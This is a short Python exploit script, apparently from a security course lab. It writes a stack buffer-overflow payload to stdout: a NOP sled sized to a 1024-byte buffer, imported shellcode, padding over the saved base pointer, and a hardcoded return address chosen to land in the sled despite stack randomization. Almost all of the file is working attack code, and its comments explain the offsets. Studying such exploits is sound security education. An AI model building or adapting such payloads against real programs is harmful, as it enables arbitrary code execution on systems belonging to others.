#!/usr/bin/env python3

from shellcode import shellcode
import sys

"""
ASLR-Resilient Exploitation Strategy
-------------------------------------

This script demonstrates techniques for constructing payloads that
remain effective despite stack address randomization.
"""

# the buffer size is 1024, it only shifts 256 max
# use nops for wasted instructions
# maybe fill woth 256 nops and instruc followed by nops

# first runthrough, the start of buffer was: rbp-0x400. halfway point of buffer is at address 0x7ffffff29040
# return address should be 0x7ffffff29040

# distance is the distance from the full buffer length - shellcode, which ensures we place the shellcode at the end of the buf
distance = 1024 - len(shellcode)
# added 8 bytes of padding after injecting shellcode to account for the 8 bytes of base pointer to get to return address
sys.stdout.buffer.write(b"\x90" * distance + shellcode + b"A" * 8 + 0x7ffffff29040.to_bytes(8, "little"))
